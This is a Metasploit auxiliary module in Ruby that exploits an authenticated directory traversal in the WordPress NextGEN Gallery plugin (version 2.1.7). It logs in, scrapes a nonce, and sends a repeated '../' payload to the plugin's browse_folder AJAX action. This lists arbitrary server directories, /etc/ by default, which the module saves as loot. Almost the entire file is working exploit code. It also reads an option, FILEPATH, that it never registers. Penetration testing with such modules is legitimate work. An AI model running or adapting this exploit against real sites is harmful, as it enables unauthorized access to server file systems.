##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::HTTP::Wordpress
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'WordPress NextGEN Gallery Directory Read Vulnerability',
      'Description'    => %q{
        This module exploits an authenticated directory traversal vulnerability
        in WordPress Plugin "NextGEN Gallery" version 2.1.7, allowing
        to read arbitrary directories with the web server privileges.
      },
      'References'     =>
        [
          ['WPVDB', '8165'],
          ['URL', 'http://permalink.gmane.org/gmane.comp.security.oss.general/17650']
        ],
      'Author'         =>
        [
          'Sathish Kumar', # Vulnerability Discovery
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('WP_USER', [true, 'A valid username', nil]),
        OptString.new('WP_PASS', [true, 'Valid password for the provided username', nil]),
        OptString.new('DIRPATH', [true, 'The path to the directory to read', '/etc/']),
        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 7 ])
      ], self.class)
  end

  def user
    datastore['WP_USER']
  end

  def password
    datastore['WP_PASS']
  end

  def check
    check_plugin_version_from_readme('nextgen-gallery', '2.1.9')
  end

  def get_nonce(cookie)
    res = send_request_cgi(
      'uri'    => normalize_uri(wordpress_url_backend, 'admin.php'),
      'method' => 'GET',
      'vars_get'  => {
        'page'    => 'ngg_addgallery'
      },
      'cookie' => cookie
    )

    if res && res.redirect? && res.redirection
      location = res.redirection
      print_status("#{peer} - Following redirect to #{location}")
      res = send_request_cgi(
        'uri'    => location,
        'method' => 'GET',
        'cookie' => cookie
      )
    end

    res.body.scan(/var browse_params = {"nextgen_upload_image_sec":"(.+)"};/).flatten.first
  end

  def run_host(ip)
    vprint_status("#{peer} - Trying to login as: #{user}")
    cookie = wordpress_login(user, password)
    if cookie.nil?
      print_error("#{peer} - Unable to login as: #{user}")
      return
    end

    vprint_status("#{peer} - Trying to get nonce...")
    nonce = get_nonce(cookie)
    if nonce.nil?
      print_error("#{peer} - Can not get nonce after login")
      return
    end
    vprint_status("#{peer} - Got nonce: #{nonce}")

    traversal = "../" * datastore['DEPTH']
    filename = datastore['DIRPATH']
    filename = filename[1, filename.length] if filename =~ /^\//

    res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => normalize_uri(target_uri.path),
      'headers'   => {
        'Referer' => "http://#{rhost}/wordpress/wp-admin/admin.php?page=ngg_addgallery",
        'X-Requested-With' => 'XMLHttpRequest'
      },
      'vars_get'  => {
        'photocrati_ajax' => '1'
      },
      'vars_post' => {
        'nextgen_upload_image_sec' => "#{nonce}",
        'action' => 'browse_folder',
        'dir' => "#{traversal}#{filename}"
      },
      'cookie'    => cookie
    )

    if res && res.code == 200 && res.body && res.body.to_s.length > 0
      begin
        results = JSON.parse(res.body)['html']
      rescue JSON::ParserError
        vprint_error("#{peer} - Unable to parse JSON")
        return
      end

      res_new = results.gsub(/<u(.*)>/, '').gsub(/<\/ul>/, '').gsub(/<l(.*)"\/..\/..\/..\/../, '').gsub(/"(.*)i>/, '')
      vprint_line("#{res_new}")
      fname = datastore['FILEPATH']
      path = store_loot(
        'nextgen.traversal',
        'text/plain',
        ip,
        res_new,
        fname
      )

      print_good("#{peer} - File saved in: #{path}")
    else
      print_error("#{peer} - Nothing was downloaded. You can try to change the DIRPATH.")
    end
  end
end
